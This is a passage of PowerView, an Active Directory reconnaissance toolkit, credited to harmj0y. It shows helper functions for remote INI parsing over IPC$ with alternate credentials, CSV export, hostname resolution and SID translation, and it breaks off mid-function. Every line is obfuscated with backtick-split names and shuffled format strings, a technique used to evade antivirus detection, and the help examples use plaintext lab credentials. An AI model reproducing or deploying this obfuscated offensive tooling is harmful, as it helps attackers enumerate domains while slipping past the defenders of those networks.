        [Parameter(ValueFromPipelineByPropertyName = ${tR`UE}, ParameterSetName = 'DynamicParameter')]
        [switch]${a`ll`o`WemP`TY`coLlECt`Ion},

        [Parameter(ValueFromPipelineByPropertyName = ${T`RuE}, ParameterSetName = 'DynamicParameter')]
        [switch]${VaL`idat`E`NOt`NUll},

        [Parameter(ValueFromPipelineByPropertyName = ${TR`Ue}, ParameterSetName = 'DynamicParameter')]
        [switch]${Valida`TeNotn`U`LL`ORe`MpTY},

        [Parameter(ValueFromPipelineByPropertyName = ${t`RUE}, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]${vALI`d`A`TEc`OunT},

        [Parameter(ValueFromPipelineByPropertyName = ${T`RUe}, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]${va`lI`Da`T`ErANgE},

        [Parameter(ValueFromPipelineByPropertyName = ${T`RUe}, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]${v`A`LidaTele`N`gth},

        [Parameter(ValueFromPipelineByPropertyName = ${TR`Ue}, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]${Va`LIdaTE`p`ATTern},

        [Parameter(ValueFromPipelineByPropertyName = ${tR`Ue}, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [scriptblock]${V`A`LIDAT`ESC`RiPT},

        [Parameter(ValueFromPipelineByPropertyName = ${T`Rue}, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string[]]${v`ALiDAT`E`Set},

        [Parameter(ValueFromPipelineByPropertyName = ${T`RuE}, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if(!(${_} -is [System.Management.Automation.RuntimeDefinedParameterDictionary]))
            {
                Throw 'Dictionary must be a System.Management.Automation.RuntimeDefinedParameterDictionary object'
            }
            ${tr`UE}
        })]
        ${DIcti`ONA`RY} = ${FAl`se},

        [Parameter(Mandatory = ${tr`UE}, ValueFromPipelineByPropertyName = ${Tr`UE}, ParameterSetName = 'CreateVariables')]
        [switch]${cr`EAT`eVA`RiAbLES},

        [Parameter(Mandatory = ${tR`Ue}, ValueFromPipelineByPropertyName = ${Tr`UE}, ParameterSetName = 'CreateVariables')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            # System.Management.Automation.PSBoundParametersDictionary is an internal sealed class,
            # so one can't use PowerShell's '-is' operator to validate type.
            if(${_}.GetType().Name -notmatch 'Dictionary') {
                Throw 'BoundParameters must be a System.Management.Automation.PSBoundParametersDictionary object'
            }
            ${TR`UE}
        })]
        ${BoUnd`ParA`meTe`RS}
    )

    Begin {
        ${INt`E`R`NALdictiO`NA`RY} = &("{1}{0}{2}"-f'bjec','New-O','t') -TypeName ("{14}{6}{13}{2}{9}{4}{10}{1}{11}{7}{15}{5}{12}{3}{0}{8}"-f 'on','efi','agemen','i','ti','eterD','ystem','dPar','ary','t.Automa','on.RuntimeD','ne','ict','.Man','S','am')
        function _`Temp { [CmdletBinding()] Param() }
        ${CoMM`ON`pARa`MEtE`RS} = (&("{2}{1}{0}" -f 'mand','et-Com','G') ("{1}{0}"-f 'emp','_t')).Parameters.Keys
    }

    Process {
        if(${CreA`TE`V`ArIAblEs}) {
            ${B`ou`NDkEYS} = ${bO`UNDP`ARa`meteRs}.Keys | &("{3}{0}{2}{1}"-f 'ere-O','ject','b','Wh') { ${co`m`mOnPa`RaM`etERS} -notcontains ${_} }
            ForEach(${ParA`mE`TER} in ${BOuN`dK`E`YS}) {
                if (${pA`RaME`TeR}) {
                    &("{3}{2}{1}{0}"-f 'e','riabl','t-Va','Se') -Name ${Par`AM`eter} -Value ${bou`NDpAr`AmE`TeRS}.${p`A`RAME`TeR} -Scope 1 -Force
                }
            }
        }
        else {
            ${st`A`LeKEyS} = @()
            ${sT`ALE`Ke`ys} = ${pSboU`N`d`PA`R`AMEtERS}.GetEnumerator() |
                        &("{3}{0}{2}{4}{1}"-f'r','ect','Eac','Fo','h-Obj') {
                            if(${_}.Value.PSobject.Methods.Name -match '^Equals$') {
                                # If object has Equals, compare bound key and variable using it
                                if(!${_}.Value.Equals((&("{1}{0}{2}{3}"-f'-','Get','Variab','le') -Name ${_}.Key -ValueOnly -Scope 0))) {
                                    ${_}.Key
                                }
                            }
                            else {
                                # If object doesn't has Equals (e.g. $null), fallback to the PowerShell's -ne operator
                                if(${_}.Value -ne (&("{1}{0}{2}" -f 'et-Variabl','G','e') -Name ${_}.Key -ValueOnly -Scope 0)) {
                                    ${_}.Key
                                }
                            }
                        }
            if(${Stale`ke`ys}) {
                ${StA`L`EkE`Ys} | &("{2}{1}{0}" -f'ject','orEach-Ob','F') {[void]${pSb`Ou`NdpArame`T`ERs}.Remove(${_})}
            }

            # Since we rely solely on $PSBoundParameters, we don't have access to default values for unbound parameters
            ${uNBoUNdpA`R`AMEt`ErS} = (&("{0}{2}{1}{3}" -f'Get-','a','Comm','nd') -Name (${p`SCm`DLeT}.MyInvocation.InvocationName)).Parameters.GetEnumerator()  |
                                        # Find parameters that are belong to the current parameter set
                                        &("{3}{2}{0}{1}"-f'je','ct','ere-Ob','Wh') { ${_}.Value.ParameterSets.Keys -contains ${pS`cMD`LeT}.ParameterSetName } |
                                            &("{3}{0}{1}{2}" -f '-','Objec','t','Select') -ExpandProperty ("{1}{0}" -f'ey','K') |
                                                # Find unbound parameters in the current parameter set
                                                &("{0}{1}{3}{2}" -f 'Wher','e','ject','-Ob') { ${ps`B`Ound`pARAM`ete`RS}.Keys -notcontains ${_} }

            # Even if parameter is not bound, corresponding variable is created with parameter's default value (if specified)
            ${t`mp} = ${Nu`ll}
            ForEach (${Pa`R`AMETer} in ${u`NbOund`pa`RAm`EteRs}) {
                ${DEfAul`TVAL`UE} = &("{1}{2}{0}{3}"-f 'ari','G','et-V','able') -Name ${pAraM`E`TER} -ValueOnly -Scope 0
                if(!${PS`BoUnDpa`RAmeT`E`RS}.TryGetValue(${pARA`M`ETEr}, [ref]${t`MP}) -and ${DEFAuL`Tv`A`LUE}) {
                    ${pSBo`UNDpA`R`AME`Te`RS}.${pAr`AME`TER} = ${DefAU`lT`Va`LuE}
                }
            }

            if(${dIct`iO`NAry}) {
                ${DpD`iCtIo`NaRy} = ${DIc`TION`A`Ry}
            }
            else {
                ${D`pDIct`IonA`RY} = ${InTErnA`ld`IctIO`NA`RY}
            }

            # Shortcut for getting local variables
            ${G`eTV`AR} = {&("{3}{2}{0}{1}" -f 'a','ble','Vari','Get-') -Name ${_} -ValueOnly -Scope 0}

            # Strings to match attributes and validation arguments
            ${aTtr`iBUTE`Re`Gex} = '^(Mandatory|Position|ParameterSetName|DontShow|HelpMessage|ValueFromPipeline|ValueFromPipelineByPropertyName|ValueFromRemainingArguments)$'
            ${Va`l`IDatIO`N`ReGEX} = '^(AllowNull|AllowEmptyString|AllowEmptyCollection|ValidateCount|ValidateLength|ValidatePattern|ValidateRange|ValidateScript|ValidateSet|ValidateNotNull|ValidateNotNullOrEmpty)$'
            ${A`lIa`SrEG`eX} = '^Alias$'
            ${paraMe`TeraT`TRib`Ute} = &("{1}{2}{3}{0}"-f 'ect','Ne','w-Ob','j') -TypeName ("{3}{0}{7}{4}{2}{8}{5}{6}{1}"-f 'tem.Ma','bute','oma','Sys','.Aut','n.Para','meterAttri','nagement','tio')

            switch -regex (${pSBOu`NdP`ARamE`TERs}.Keys) {
                ${att`RIbUtE`REG`Ex} {
                    Try {
                        ${Pa`Ra`meTerA`Tt`Rib`U`Te}.${_} = . ${Get`VAR}
                    }
                    Catch {
                        ${_}
                    }
                    continue
                }
            }

            if(${DP`dIC`TioN`ARY}.Keys -contains ${nA`mE}) {
                ${dpdiC`T`I`ONARY}.${na`ME}.Attributes.Add(${PARa`mEte`RatTRibU`TE})
            }
            else {
                ${A`TTriBUTE`c`o`L`lectiOn} = &("{0}{1}{2}{3}" -f'New','-O','bj','ect') -TypeName ("{5}{3}{8}{4}{6}{7}{2}{0}{9}{1}"-f 'tion[','tribute]','lec','ollec','ec','C','tModel','.Col','tions.Obj','System.At')
                switch -regex (${psBOu`NDParame`T`ers}.Keys) {
                    ${va`liDA`TiOnR`eg`EX} {
                        Try {
                            ${P`AraM`e`TE`ROP`TiONS} = &("{0}{2}{1}"-f'New','ect','-Obj') -TypeName "System.Management.Automation.${_}Attribute" -ArgumentList (. ${geT`VAR}) -ErrorAction ("{0}{1}" -f'St','op')
                            ${aTtr`IbuT`EcoLLe`Cti`oN}.Add(${pARam`Et`Ero`p`Tions})
                        }
                        Catch { ${_} }
                        continue
                    }
                    ${al`iAS`ReGex} {
                        Try {
                            ${p`A`R`AmETERAliAs} = &("{2}{1}{0}{3}" -f'b','-O','New','ject') -TypeName ("{9}{6}{1}{7}{8}{3}{4}{2}{0}{5}" -f 'Att','t','omation.Alias','Managemen','t.Aut','ribute','s','e','m.','Sy') -ArgumentList (. ${GEt`VAr}) -ErrorAction ("{0}{1}"-f 'S','top')
                            ${atT`RIBu`T`ecO`lLEc`TIon}.Add(${PAraMete`R`A`L`iaS})
                            continue
                        }
                        Catch { ${_} }
                    }
                }
                ${a`Tt`R`iBUteCoL`LectI`ON}.Add(${pa`RaMe`TErATtribU`Te})
                ${P`ARA`m`ETer} = &("{1}{0}{2}"-f '-Objec','New','t') -TypeName ("{0}{2}{6}{8}{5}{1}{3}{10}{7}{4}{9}"-f'Syste','Runtim','m.Ma','e','e','n.','nagem','finedParam','ent.Automatio','ter','De') -ArgumentList @(${nA`ME}, ${T`ype}, ${ATTRiButEco`L`l`ECtIoN})
                ${d`PDi`ctION`ARY}.Add(${n`Ame}, ${p`A`RAM`eTeR})
            }
        }
    }

    End {
        if(!${Cre`A`T`EvAriAblEs} -and !${diCt`i`onaRY}) {
            ${DpDi`ctiO`Na`Ry}
        }
    }
}


function g`eT-`IN`ICO`NtEnT {
<#
.SYNOPSIS

This helper parses an .ini file into a hashtable.

Author: 'The Scripting Guys'
Modifications: @harmj0y (-Credential support)
License: BSD 3-Clause
Required Dependencies: Add-RemoteConnection, Remove-RemoteConnection

.DESCRIPTION

Parses an .ini file into a hashtable. If -Credential is supplied,
then Add-RemoteConnection is used to map \\COMPUTERNAME\IPC$, the file
is parsed, and then the connection is destroyed with Remove-RemoteConnection.

.PARAMETER Path

Specifies the path to the .ini file to parse.

.PARAMETER OutputObject

Switch. Output a custom PSObject instead of a hashtable.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system.

.EXAMPLE

Get-IniContent C:\Windows\example.ini

.EXAMPLE

"C:\Windows\example.ini" | Get-IniContent -OutputObject

Outputs the .ini details as a proper nested PSObject.

.EXAMPLE

"C:\Windows\example.ini" | Get-IniContent

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-IniContent -Path \\PRIMARY.testlab.local\C$\Temp\GptTmpl.inf -Credential $Cred

.INPUTS

String

Accepts one or more .ini paths on the pipeline.

.OUTPUTS

Hashtable

Ouputs a hashtable representing the parsed .ini file.

.LINK

https://blogs.technet.microsoft.com/heyscriptingguy/2011/08/20/use-powershell-to-work-with-any-ini-file/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = ${Tr`Ue}, ValueFromPipeline = ${tr`Ue}, ValueFromPipelineByPropertyName = ${tR`UE})]
        [Alias('FullName', 'Name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${Pa`Th},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cR`edE`Nt`IAl} = [Management.Automation.PSCredential]::Empty,

        [Switch]
        ${oUTPu`TO`BjeCT}
    )

    BEGIN {
        ${MaPP`E`D`cOMpUt`eRs} = @{}
    }

    PROCESS {
        ForEach (${TA`RGE`TpA`Th} in ${p`Ath}) {
            if ((${TaRg`eTPa`Th} -Match '\\\\.*\\.*') -and (${psbO`UnD`PAr`AMETe`Rs}['Credential'])) {
                ${hoST`cOMP`U`T`eR} = (&("{2}{1}{0}"-f 'ect','ew-Obj','N') ("{0}{1}{2}"-f'S','ystem.Ur','i')(${Ta`RGe`TPA`Th})).Host
                if (-not ${mAPP`Edco`MpUt`e`RS}[${H`os`T`cOMPuter}]) {
                    # map IPC$ to this computer if it's not already
                    &("{2}{0}{4}{1}{3}" -f'-R','ctio','Add','n','emoteConne') -ComputerName ${HOStC`Om`P`Uter} -Credential ${cREd`En`Ti`Al}
                    ${mA`pPedC`ompu`Ters}[${H`Os`TCOMpUTeR}] = ${T`RuE}
                }
            }

            if (&("{2}{0}{3}{1}" -f 'e','ath','T','st-P') -Path ${ta`RGEtP`A`Th}) {
                if (${P`sbOUN`dP`ARAMETeRs}['OutputObject']) {
                    ${In`iob`JEct} = &("{2}{1}{0}"-f'-Object','ew','N') ("{0}{2}{1}"-f 'PSO','t','bjec')
                }
                else {
                    ${iN`i`oBjEct} = @{}
                }
                Switch -Regex -File ${ta`R`g`ETpAtH} {
                    "^\[(.+)\]" # Section
                    {
                        ${S`EcT`iON} = ${MAt`cHes}[1].Trim()
                        if (${PSB`OUNDp`ARa`mEt`e`Rs}['OutputObject']) {
                            ${s`ECti`on} = ${S`EcTiOn}.Replace(' ', '')
                            ${s`E`cTIONObjECt} = &("{1}{2}{0}"-f 't','New-Ob','jec') ("{0}{2}{1}" -f 'P','bject','SO')
                            ${InIO`Bj`eCt} | &("{2}{1}{3}{0}" -f 'r','em','Add-M','be') ("{1}{3}{2}{0}"-f'rty','N','pe','otepro') ${sECT`ION} ${sEC`TI`On`OBjeCT}
                        }
                        else {
                            ${iN`i`oBJect}[${sECT`I`On}] = @{}
                        }
                        ${cO`Mm`ENtcOunT} = 0
                    }
                    "^(;.*)$" # Comment
                    {
                        ${v`ALue} = ${MAtc`HeS}[1].Trim()
                        ${C`OmME`NtcO`UNT} = ${c`o`m`MEnTcOUNT} + 1
                        ${N`AMe} = 'Comment' + ${CoMMeNt`co`UNt}
                        if (${p`SBOu`NDpaRa`M`eTERS}['OutputObject']) {
                            ${n`Ame} = ${NA`mE}.Replace(' ', '')
                            ${iN`i`oBJEct}.${Sec`TI`oN} | &("{2}{1}{0}" -f 'ember','M','Add-') ("{2}{0}{1}"-f 'oteproper','ty','N') ${n`AMe} ${VA`L`UE}
                        }
                        else {
                            ${in`IO`BJECT}[${Se`CT`iON}][${Na`ME}] = ${VaL`UE}
                        }
                    }
                    "(.+?)\s*=(.*)" # Key
                    {
                        ${n`Ame}, ${VaL`UE} = ${Ma`Tc`hES}[1..2]
                        ${na`mE} = ${nA`me}.Trim()
                        ${vaL`U`ES} = ${V`AL`UE}.split(',') | &("{1}{0}{2}"-f 'or','F','Each-Object') { ${_}.Trim() }

                        # if ($Values -isnot [System.Array]) { $Values = @($Values) }

                        if (${pSb`OUnDp`Ar`AME`TErs}['OutputObject']) {
                            ${NA`ME} = ${n`AmE}.Replace(' ', '')
                            ${in`I`OB`jECt}.${s`ec`Tion} | &("{2}{0}{1}" -f'd-','Member','Ad') ("{1}{3}{0}{2}"-f 'e','No','property','t') ${nA`Me} ${VA`LUes}
                        }
                        else {
                            ${inio`Bj`Ect}[${SEC`T`ioN}][${N`AMe}] = ${v`A`LUes}
                        }
                    }
                }
                ${inIo`BJ`ECt}
            }
        }
    }

    END {
        # remove the IPC$ mappings
        ${MApp`E`D`compUtERs}.Keys | &("{4}{3}{2}{1}{0}"-f 'nection','moteCon','ve-Re','mo','Re')
    }
}


function exPO`RT-p`owerVi`EWCSV {
<#
.SYNOPSIS

Converts objects into a series of comma-separated (CSV) strings and saves the
strings in a CSV file in a thread-safe manner.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

This helper exports an -InputObject to a .csv in a thread-safe manner
using a mutex. This is so the various multi-threaded functions in
PowerView has a thread-safe way to export output to the same file.
Uses .NET IO.FileStream/IO.StreamWriter objects for speed.

Originally based on Dmitry Sotnikov's Export-CSV code: http://poshcode.org/1590

.PARAMETER InputObject

Specifies the objects to export as CSV strings.

.PARAMETER Path

Specifies the path to the CSV output file.

.PARAMETER Delimiter

Specifies a delimiter to separate the property values. The default is a comma (,)

.PARAMETER Append

Indicates that this cmdlet adds the CSV output to the end of the specified file.
Without this parameter, Export-PowerViewCSV replaces the file contents without warning.

.EXAMPLE

Get-DomainUser | Export-PowerViewCSV -Path "users.csv"

.EXAMPLE

Get-DomainUser | Export-PowerViewCSV -Path "users.csv" -Append -Delimiter '|'

.INPUTS

PSObject

Accepts one or more PSObjects on the pipeline.

.LINK

http://poshcode.org/1590
http://dmitrysotnikov.wordpress.com/2010/01/19/Export-Csv-append/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = ${t`RUE}, ValueFromPipeline = ${tR`UE}, ValueFromPipelineByPropertyName = ${T`RUE})]
        [System.Management.Automation.PSObject[]]
        ${Inpu`To`BJ`ECt},

        [Parameter(Mandatory = ${t`RUE}, Position = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        ${P`Ath},

        [Parameter(Position = 2)]
        [ValidateNotNullOrEmpty()]
        [Char]
        ${d`ELIM`ITEr} = ',',

        [Switch]
        ${AP`pe`ND}
    )

    BEGIN {
        ${oUtPU`T`PA`TH} = [IO.Path]::GetFullPath(${P`SBOUnD`p`ARA`mete`Rs}['Path'])
        ${e`xiSTS} = [System.IO.File]::Exists(${O`UtpU`TPATh})

        # mutex so threaded code doesn't stomp on the output file
        ${M`Ut`eX} = &("{0}{3}{1}{2}"-f 'N','w-Ob','ject','e') ("{1}{2}{3}{4}{0}"-f 'ex','System.T','hreadin','g','.Mut') ${faL`sE},'CSVMutex'
        ${nU`Ll} = ${M`U`Tex}.WaitOne()

        if (${pSbOU`NdPArAme`T`E`Rs}['Append']) {
            ${f`ilemO`De} = [System.IO.FileMode]::Append
        }
        else {
            ${f`iLEMODe} = [System.IO.FileMode]::Create
            ${EXi`S`Ts} = ${fal`sE}
        }

        ${c`SV`STrEAm} = &("{2}{0}{3}{1}"-f'e','ject','N','w-Ob') ("{3}{0}{1}{2}"-f'r','e','am','IO.FileSt')(${OuT`PU`TpATh}, ${FiLeM`o`DE}, [System.IO.FileAccess]::Write, [IO.FileShare]::Read)
        ${c`S`VwRI`Ter} = &("{0}{3}{1}{2}" -f 'New-O','je','ct','b') ("{6}{0}{4}{5}{3}{2}{1}" -f 'tem.','ter','i','StreamWr','IO','.','Sys')(${C`svS`TrEam})
        ${C`S`VWRITeR}.AutoFlush = ${t`RUE}
    }

    PROCESS {
        ForEach (${e`Nt`RY} in ${InPUt`ob`j`eCT}) {
            ${OBJECT`c`sv} = &("{3}{1}{0}{2}"-f'vertTo-Cs','n','v','Co') -InputObject ${E`N`Try} -Delimiter ${dEL`iMI`TER} -NoTypeInformation

            if (-not ${e`XIS`TS}) {
                # output the object field names as well
                ${o`Bje`C`TcSv} | &("{1}{0}{4}{2}{3}"-f'c','ForEa','Objec','t','h-') { ${C`SvWrit`er}.WriteLine(${_}) }
                ${ExI`stS} = ${t`RUE}
            }
            else {
                # only output object field data
                ${obJ`EC`TCSv}[1..(${oB`jec`T`csV}.Length-1)] | &("{1}{4}{0}{2}{3}"-f'Ob','ForEach','jec','t','-') { ${Cs`VWrI`TeR}.WriteLine(${_}) }
            }
        }
    }

    END {
        ${mu`TeX}.ReleaseMutex()
        ${CS`VwRi`Ter}.Dispose()
        ${CSVS`Tre`AM}.Dispose()
    }
}


function ReSOl`VE-`ipad`D`R`ESs {
<#
.SYNOPSIS

Resolves a given hostename to its associated IPv4 address.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

Resolves a given hostename to its associated IPv4 address using
[Net.Dns]::GetHostEntry(). If no hostname is provided, the default
is the IP address of the localhost.

.EXAMPLE

Resolve-IPAddress -ComputerName SERVER

.EXAMPLE

@("SERVER1", "SERVER2") | Resolve-IPAddress

.INPUTS

String

Accepts one or more IP address strings on the pipeline.

.OUTPUTS

System.Management.Automation.PSCustomObject

A custom PSObject with the ComputerName and IPAddress.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${tR`UE}, ValueFromPipelineByPropertyName = ${t`Rue})]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${C`OmpUt`ERnAmE} = ${en`V:Co`MPUTER`N`AMe}
    )

    PROCESS {
        ForEach (${cO`M`PuTeR} in ${cOmpuTer`N`AMe}) {
            try {
                @(([Net.Dns]::GetHostEntry(${Com`P`UtEr})).AddressList) | &("{1}{2}{0}{3}" -f 'ch-O','ForE','a','bject') {
                    if (${_}.AddressFamily -eq 'InterNetwork') {
                        ${O`UT} = &("{1}{2}{0}" -f't','New','-Objec') ("{2}{0}{1}"-f 'c','t','PSObje')
                        ${o`UT} | &("{0}{2}{1}" -f'Add','er','-Memb') ("{1}{2}{0}" -f 'property','No','te') 'ComputerName' ${C`omP`Uter}
                        ${o`Ut} | &("{3}{0}{2}{1}"-f'Memb','r','e','Add-') ("{3}{2}{1}{0}" -f'ty','roper','ep','Not') 'IPAddress' ${_}.IPAddressToString
                        ${o`Ut}
                    }
                }
            }
            catch {
                &("{1}{2}{0}" -f 'rbose','Wr','ite-Ve') "[Resolve-IPAddress] Could not resolve $Computer to an IP Address."
            }
        }
    }
}


function Conv`er`TT`o-s`id {
<#
.SYNOPSIS

Converts a given user/group name to a security identifier (SID).

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Convert-ADName, Get-DomainObject, Get-Domain  

.DESCRIPTION

Converts a "DOMAIN\username" syntax to a security identifier (SID)
using System.Security.Principal.NTAccount's translate function. If alternate
credentials are supplied, then Get-ADObject is used to try to map the name
to a security identifier.

.PARAMETER ObjectName

The user/group name to convert, can be 'user' or 'DOMAIN\user' format.

.PARAMETER Domain

Specifies the domain to use for the translation, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to for the translation.

.PARAMETER Credential

Specifies an alternate credential to use for the translation.

.EXAMPLE

ConvertTo-SID 'DEV\dfm'

.EXAMPLE

'DEV\dfm','DEV\krbtgt' | ConvertTo-SID

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
'TESTLAB\dfm' | ConvertTo-SID -Credential $Cred

.INPUTS

String

Accepts one or more username specification strings on the pipeline.

.OUTPUTS

String

A string representing the SID of the translated name.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = ${TR`UE}, ValueFromPipeline = ${T`RuE}, ValueFromPipelineByPropertyName = ${TR`UE})]
        [Alias('Name', 'Identity')]
        [String[]]
        ${o`Bj`eCtNA`ME},

        [ValidateNotNullOrEmpty()]
        [String]
        ${doM`A`in},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${sErv`ER},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`R`EdeNtI`AL} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        ${DOm`AinS`EarCH`er`ArgUM`EnTs} = @{}
        if (${Ps`BoUN`Dp`ArAm`ETE`RS}['Domain']) { ${DOMa`Inse`ARcH`E`RaRG`UMeNTs}['Domain'] = ${do`Ma`in} }
        if (${p`SBo`UNDPar`AM`e`TerS}['Server']) { ${d`omaiNSEar`ch`ERAR`gUm`ENTs}['Server'] = ${s`Erv`Er} }
        if (${PSBOund`PaRAMe`TE`Rs}['Credential']) { ${DoMAINSEArCh`E`Ra`Rg`UMENts}['Credential'] = ${CREd`E`NTIaL} }
    }

    PROCESS {
        ForEach (${ObJE`cT} in ${o`BJ`e`CTnAMe}) {
            ${O`B`jecT} = ${O`Bj`ect} -Replace '/','\'

            if (${PSB`oU`N`dpArAM`etErS}['Credential']) {
                ${dn} = &("{2}{1}{0}"-f 'ADName','t-','Conver') -Identity ${OB`j`ECT} -OutputType 'DN' @DomainSearcherArguments
                if (${Dn}) {
                    ${u`SeR`D`OMaIn} = ${dN}.SubString(${D`N}.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                    ${usEr`NAmE} = ${dN}.Split(',')[0].split('=')[1]

                    ${DOM`AiNsEaR`C`HE`R`A`Rgumen`Ts}['Identity'] = ${uSE`Rna`mE}
                    ${D`OM`AINsEARChE`RA`RGUMEn`TS}['Domain'] = ${user`d`OMAIN}
                    ${DO`M`A`In`sEarCHER`ARg`UmEnTs}['Properties'] = 'objectsid'
                    &("{4}{1}{3}{0}{2}"-f 'ma','e','inObject','t-Do','G') @DomainSearcherArguments | &("{0}{2}{1}"-f 'Select-O','ject','b') -Expand ("{1}{2}{0}"-f'tsid','obj','ec')
                }
            }
            else {
                try {
                    if (${obJe`ct}.Contains('\')) {
                        ${dOma`In} = ${Obj`ecT}.Split('\')[0]
                        ${o`BJe`cT} = ${o`BJ`Ect}.Split('\')[1]
                    }
                    elseif (-not ${psbouN`D`pAram`EtErs}['Domain']) {
                        ${DOMainS`Ea`RchE`Rarg`Um`E`NtS} = @{}
                        ${dom`A`IN} = (&("{2}{1}{0}"-f'in','et-Doma','G') @DomainSearcherArguments).Name
                    }

                    ${o`Bj} = (&("{2}{0}{1}{3}"-f'ew-','Ob','N','ject') ("{1}{4}{0}{2}{3}{5}"-f'.Pri','Syst','ncipa','l.NTAccoun','em.Security','t')(${D`Om`AiN}, ${o`B`Ject}))
                    ${o`Bj}.Translate([System.Security.Principal.SecurityIdentifier]).Value
                }
                catch {
                    &("{0}{3}{4}{2}{1}" -f'W','bose','r','rite-V','e') "[ConvertTo-SID] Error converting $Domain\$Object : $_"
                }
            }
        }
    }
}


function Con`Ve`Rt`FRoM-SiD {
<#
.SYNOPSIS

Converts a security identifier (SID) to a group/user name.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Convert-ADName  

.DESCRIPTION

Converts a security identifier string (SID) to a group/user name
using Convert-ADName.

.PARAMETER ObjectSid

Specifies one or more SIDs to convert.

.PARAMETER Domain

Specifies the domain to use for the translation, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to for the translation.

.PARAMETER Credential

Specifies an alternate credential to use for the translation.

.EXAMPLE

ConvertFrom-SID S-1-5-21-890171859-3433809279-3366196753-1108

TESTLAB\harmj0y

.EXAMPLE

"S-1-5-21-890171859-3433809279-3366196753-1107", "S-1-5-21-890171859-3433809279-3366196753-1108", "S-1-5-32-562" | ConvertFrom-SID

TESTLAB\WINDOWS2$
TESTLAB\harmj0y
BUILTIN\Distributed COM Users

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm', $SecPassword)
ConvertFrom-SID S-1-5-21-890171859-3433809279-3366196753-1108 -Credential $Cred

TESTLAB\harmj0y

.INPUTS

String

Accepts one or more SID strings on the pipeline.

.OUTPUTS

String

The converted DOMAIN\username.
#>

    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = ${tR`UE}, ValueFromPipeline = ${tR`UE}, ValueFromPipelineByPropertyName = ${T`RuE})]
        [Alias('SID')]
        [ValidatePattern('^S-1-.*')]
        [String[]]
        ${ObJ`ecTs`iD},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`o`MaIN},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${SE`R`VER},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`R`eDenTIaL} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        ${ad`Nam`EAr`gu`menTs} = @{}
        if (${PsBouN`DPaRaMe`T`eRS}['Domain']) { ${ad`NAmE`A`RGUMEn`Ts}['Domain'] = ${dom`AIn} }
        if (${Ps`Bou`NdParAm`eT`ERs}['Server']) { ${aD`NAmeA`Rgum`e`Nts}['Server'] = ${S`er`VEr} }
        if (${PsbOun`DPar`A`mETE`RS}['Credential']) { ${AdN`AmEArGum`En`Ts}['Credential'] = ${crEd`enTi`AL} }
    }

    PROCESS {
        ForEach (${taRGE`T`sID} in ${O`Bj`ects`ID}) {
            ${tA`RGetS`iD} = ${targE`T`Sid}.trim('*')
            try {
                # try to resolve any built-in SIDs first - https://support.microsoft.com/en-us/kb/243330
                Switch (${Ta`Rg`EtsId}) {
                    'S-1-0'         { 'Null Authority' }
                    'S-1-0-0'       { 'Nobody' }
                    'S-1-1'         { 'World Authority' }
                    'S-1-1-0'       { 'Everyone' }
                    'S-1-2'         { 'Local Authority' }
                    'S-1-2-0'       { 'Local' }
                    'S-1-2-1'       { 'Console Logon ' }
                    'S-1-3'         { 'Creator Authority' }
                    'S-1-3-0'       { 'Creator Owner' }
                    'S-1-3-1'       { 'Creator Group' }
                    'S-1-3-2'       { 'Creator Owner Server' }
                    'S-1-3-3'       { 'Creator Group Server' }
                    'S-1-3-4'       { 'Owner Rights' }
                    'S-1-4'         { 'Non-unique Authority' }
                    'S-1-5'         { 'NT Authority' }
